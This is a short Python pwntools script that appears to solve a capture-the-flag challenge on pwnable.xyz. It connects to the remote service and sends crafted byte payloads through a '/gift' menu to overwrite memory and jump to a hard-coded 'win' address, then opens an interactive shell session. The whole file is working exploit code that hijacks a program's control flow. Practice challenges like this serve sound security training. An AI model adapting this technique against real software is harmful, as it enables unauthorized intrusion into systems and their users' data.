from pwn import *

win_addr = 0x400cae
#sh = process('./challenge')

sh = remote('svc.pwnable.xyz', 30034)

sh.sendlineafter('> ', '/gift')


gift = "\xff"*0xdf + "\x8c" + "\xff"*0xbf + "\xae"
sh.sendlineafter(': ', '448')
sh.sendafter(': ', gift)
sh.sendlineafter('> ', '/gift')
sh.sendlineafter(': ', '32')
sh.sendlineafter(': ', "A"*8 + p64(win_addr)) 
sh.sendlineafter('> ', '/gift')
sh.interactive()

